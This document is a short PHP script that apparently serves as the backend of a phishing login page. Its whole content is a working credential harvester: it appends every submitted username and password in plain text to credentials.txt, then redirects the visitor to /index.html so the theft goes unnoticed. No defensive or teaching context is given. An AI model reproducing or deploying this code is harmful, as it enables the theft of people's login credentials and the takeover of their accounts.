<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 $username = $_POST['username'];
 $password = $_POST['password'];

 // Save the credentials to a file
 file_put_contents('credentials.txt', "Username: $username\nPassword: $password\n\n", FILE_APPEND);

 // Redirect back to the login page
 header('Location: /index.html');
 exit();
}
?>
